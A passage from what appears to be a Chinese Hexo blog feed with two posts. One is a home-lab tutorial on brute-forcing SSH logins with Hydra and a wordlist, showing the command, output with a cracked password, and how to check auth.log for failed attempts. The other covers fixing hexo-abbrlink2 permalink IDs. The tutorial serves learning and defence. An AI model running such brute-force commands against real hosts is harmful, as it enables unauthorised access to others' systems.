  <entry>
    <title>ssh枚举爆破密码</title>
    <link href="/posts/3/"/>
    <url>/posts/3/</url>
    
    <content type="html"><![CDATA[<h1 id="一，适用场景"><a href="#一，适用场景" class="headerlink" title="一，适用场景"></a>一，适用场景</h1><p><strong>弱密码 开启ssh</strong></p><h1 id="二，-基本原理"><a href="#二，-基本原理" class="headerlink" title="二， 基本原理"></a>二， 基本原理</h1><p>使用暴力破解密码工具hydra中的ssh密码破解工具</p><p>hydra -l [user] -P [字典] ssh:&#x2F;&#x2F;[ip]</p><h1 id="三，实战"><a href="#三，实战" class="headerlink" title="三，实战"></a>三，实战</h1><h2 id="准备-靶机开启ssh"><a href="#准备-靶机开启ssh" class="headerlink" title="准备 靶机开启ssh"></a>准备 靶机开启ssh</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install openssh-server<br><span class="hljs-built_in">sudo</span> systemctl start sshd  <span class="hljs-comment">#启用</span><br><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> sshd  <span class="hljs-comment">#开机自启</span><br></code></pre></td></tr></table></figure><h2 id="攻击端"><a href="#攻击端" class="headerlink" title="攻击端"></a>攻击端</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hydra -l ljw -P passlist<span class="hljs-selector-class">.txt</span> ssh:<span class="hljs-comment">//192.168.182.128</span><br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ljw@ljw:~/桌面$ hydra -l ljw -P passlist.txt ssh://<span class="hljs-number">192.168</span><span class="hljs-number">.182</span><span class="hljs-number">.128</span><br><br>Hydra v9<span class="hljs-number">.6</span> (c) <span class="hljs-number">2023</span> <span class="hljs-keyword">by</span> van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> use <span class="hljs-keyword">in</span> military <span class="hljs-keyword">or</span> secret service organizations, <span class="hljs-keyword">or</span> <span class="hljs-keyword">for</span> illegal purposes (this <span class="hljs-keyword">is</span> non-binding, these *** ignore laws <span class="hljs-keyword">and</span> ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="hljs-number">2026</span><span class="hljs-number">-07</span><span class="hljs-number">-12</span> <span class="hljs-number">21</span>:<span class="hljs-number">53</span>:<span class="hljs-number">08</span><br>[<span class="hljs-built_in">WARNING</span>] Many SSH configurations <span class="hljs-keyword">limit</span> the number <span class="hljs-keyword">of</span> parallel tasks, it <span class="hljs-keyword">is</span> recommended <span class="hljs-keyword">to</span> reduce the tasks: use -t <span class="hljs-number">4</span><br>[DATA] max <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> <span class="hljs-keyword">server</span>, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">42</span> <span class="hljs-keyword">login</span> tries (l:<span class="hljs-number">1</span>/p:<span class="hljs-number">42</span>), ~<span class="hljs-number">3</span> tries per task<br>[DATA] attacking ssh://<span class="hljs-number">192.168</span><span class="hljs-number">.182</span><span class="hljs-number">.128</span>:<span class="hljs-number">22</span>/<br>[<span class="hljs-number">22</span>][ssh] host: <span class="hljs-number">192.168</span><span class="hljs-number">.182</span><span class="hljs-number">.128</span>   <span class="hljs-keyword">login</span>: ljw   <span class="hljs-keyword">password</span>: lljjww123<br><span class="hljs-number">1</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> <span class="hljs-keyword">valid</span> <span class="hljs-keyword">password</span> <span class="hljs-built_in">found</span><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at <span class="hljs-number">2026</span><span class="hljs-number">-07</span><span class="hljs-number">-12</span> <span class="hljs-number">21</span>:<span class="hljs-number">53</span>:<span class="hljs-number">18</span><br></code></pre></td></tr></table></figure><h1 id="四，扩展"><a href="#四，扩展" class="headerlink" title="四，扩展"></a>四，扩展</h1><h2 id="1-ssh日志"><a href="#1-ssh日志" class="headerlink" title="1.ssh日志"></a>1.ssh日志</h2><p><strong>var&#x2F;log&#x2F;auth.log</strong> linux身份验证日志</p><p><code>sudo cat /var/log/auth.log </code></p><h2 id="2-cat是什么-，-tail-vim"><a href="#2-cat是什么-，-tail-vim" class="headerlink" title="2.cat是什么 ， tail vim?"></a>2.cat是什么 ， tail vim?</h2><table><thead><tr><th>命令</th><th>核心用途</th><th>文件读取方式</th><th>能否编辑文件</th><th>适合攻防场景</th></tr></thead><tbody><tr><td>cat</td><td>一次性完整打印文件全部内容到终端</td><td>一次性加载全部输出</td><td>❌ 只读，无法修改</td><td>查看小文件、日志片段、字典、sshd_config短配置</td></tr><tr><td>tail</td><td>只读取文件末尾内容，支持实时刷新</td><td>读取尾部，可持续监听新增行</td><td>❌ 只读</td><td>实时监控SSH爆破日志、攻击行为、fail2ban告警</td></tr><tr><td>vim</td><td>文本编辑器，查看+修改文件</td><td>分页加载大文件</td><td>✅ 完整读写编辑</td><td>修改靶机配置、编写字典、写Shell脚本、编辑sshd限制</td></tr></tbody></table><h2 id="3-cat如何筛选？"><a href="#3-cat如何筛选？" class="headerlink" title="3.cat如何筛选？"></a>3.cat如何筛选？</h2><h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><p>在 Linux 中，竖杠 | 被称为管道符，用于将一个命令的输出作为另一个命令的输入<br>sudo cat &#x2F;var&#x2F;log&#x2F;auth.log | grep “Failed”<br>筛选含有Failed的行</p>]]></content>
    
    
    
    <tags>
      
      <tag>网络安全</tag>
      
      <tag>ssh</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于hexo-abbrlink2生成的数字ID混乱问题</title>
    <link href="/posts/2/"/>
    <url>/posts/2/</url>
    
    <content type="html"><![CDATA[<blockquote><p>我想要更简洁的hexo永久链接,于是安装了hexo-abbrlink2插件,可是在<code>hexo clean</code>之后,文章与ID对应完全混乱</p></blockquote><h2 id="插件逻辑"><a href="#插件逻辑" class="headerlink" title="插件逻辑"></a>插件逻辑</h2><h4 id="第一级-最高优先级-Front-matter-头文件"><a href="#第一级-最高优先级-Front-matter-头文件" class="headerlink" title="第一级:最高优先级  Front-matter(头文件)"></a>第一级:最高优先级  Front-matter(头文件)</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">if</span> (data.<span class="hljs-property">abbrlink</span>) &#123; <span class="hljs-keyword">return</span> data; &#125;<br></code></pre></td></tr></table></figure><p>可见如果.md文件顶部写了<code>abbrlink: 26</code>,插件直接将此ID分配给文章</p><h4 id="第二级-文章级缓存-db-json-中的文章记录（软固定）"><a href="#第二级-文章级缓存-db-json-中的文章记录（软固定）" class="headerlink" title="第二级:文章级缓存 db.json 中的文章记录（软固定）"></a>第二级:文章级缓存 db.json 中的文章记录（软固定）</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> cache = model.<span class="hljs-title function_">findById</span>(data.<span class="hljs-property">_id</span>);<br><span class="hljs-keyword">if</span> (cache &amp;&amp; <span class="hljs-keyword">typeof</span> cache.<span class="hljs-property">maxid</span> === <span class="hljs-string">&#x27;number&#x27;</span>) &#123; data.<span class="hljs-property">abbrlink</span> = cache.<span class="hljs-property">maxid</span>; <span class="hljs-keyword">return</span> data; &#125;<br></code></pre></td></tr></table></figure><p>如果 Front-matter 里没写,插件就去 db.json 里找,看这篇文章以前是否被分配过 ID</p><p><code>hexo clean</code>后,db.json被删除,本级无法找到ID</p><h4 id="第三级-db-json读取目前分配过的最大ID-1"><a href="#第三级-db-json读取目前分配过的最大ID-1" class="headerlink" title="第三级:db.json读取目前分配过的最大ID+1"></a>第三级:db.json读取目前分配过的最大ID+1</h4><p>插件去 db.json 里找一个特殊记录（键名为 c-thiskeyusingbyabbrlink2），这个记录是分配过的最大 ID。</p><p><code>hexo clean</code>后,db.json被删除,本级无法找到ID</p><h4 id="第四级-config-yml里设置的start值"><a href="#第四级-config-yml里设置的start值" class="headerlink" title="第四级: _config.yml里设置的start值"></a>第四级: _config.yml里设置的start值</h4><p><code>hexo clean</code>后,原有的对应关系丢失,这时如果<code>hexo new</code>就会导致新文章的ID再次从start+1开始,同时,就算不新建博客,当<code>hexo clean</code>删除了db.json，且文章 Front-matter 中没有abbrlink字段时，再次<code>hexo g</code>会因为文件读取顺序的不确定性导致 ID 对应关系混乱。</p><h2 id="解决措施"><a href="#解决措施" class="headerlink" title="解决措施"></a>解决措施</h2><p>不能不用hexo clean,于是在每篇文章的头文件中添加abbrlink: ID即可</p><p>为了每次new一个新文件,让他的头文件中都自带<code>abbrlink:</code>,可以修改scaffolds目录(文章模板)下的post.md</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">---<br>title: &#123;&#123; title &#125;&#125;<br>date: &#123;&#123; date &#125;&#125;<br>tags: <br><span class="hljs-section">abbrlink: </span><br><span class="hljs-section">---</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>问题解决</tag>
      
    </tags>
    
  </entry>
  
  
  
